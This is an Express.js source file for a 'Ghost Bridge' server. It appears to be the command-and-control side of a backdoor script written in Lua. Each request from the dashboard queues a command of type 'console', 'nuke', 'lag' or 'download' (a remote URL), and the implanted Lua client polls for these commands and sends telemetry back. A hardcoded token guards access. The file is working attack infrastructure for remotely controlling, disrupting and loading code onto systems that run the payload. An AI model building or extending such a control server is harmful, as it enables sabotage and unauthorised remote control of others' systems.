const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Internal State
let PENDING_COMMANDS = []; // Array of queued commands
let LAST_TELEMETRY = {};
const TOKEN = "GHOST_2025";

// Endpoint 1: Dashboard adds a command to the queue
app.post('/api/exec', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    const { action, input, customText, duration, url } = req.body;
    let cmdPayload = "";

    // Build the command string for Lua
    if (action === "console") {
        cmdPayload = JSON.stringify({ type: "console", data: input });
    } else if (action === "nuke") {
        cmdPayload = JSON.stringify({ type: "nuke", text: customText || "NUKED" });
    } else if (action === "lag") {
        cmdPayload = JSON.stringify({ type: "lag", duration: duration });
    } else if (action === "download") {
        cmdPayload = JSON.stringify({ type: "download", url: url });
    }

    // Push to queue
    PENDING_COMMANDS.push(cmdPayload);
    console.log(`[Bridge] Queued command: ${cmdPayload}`);
    res.json({ status: 'queued' });
});

// Endpoint 2: Lua polls for commands (THE CRITICAL FIX)
app.get('/api/poll', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    if (PENDING_COMMANDS.length > 0) {
        // Shift (remove) the first command from the queue
        const cmd = PENDING_COMMANDS.shift();
        console.log(`[Bridge] Dispatching command to Lua`);
        res.json({ status: 'active', command: cmd });
    } else {
        res.json({ status: 'idle' });
    }
});

// Endpoint 3: Telemetry (Optional, for stats display)
app.post('/api/telemetry', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    LAST_TELEMETRY = req.body;
    res.json({ status: 'received' });
});

// Endpoint 4: Stats Delivery (Dashboard reads last known state)
app.get('/api/stats', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    res.json(LAST_TELEMETRY || { status: 'No data yet' });
});

app.listen(8080, () => console.log(`Ghost Bridge Active (Pull Mode)`));
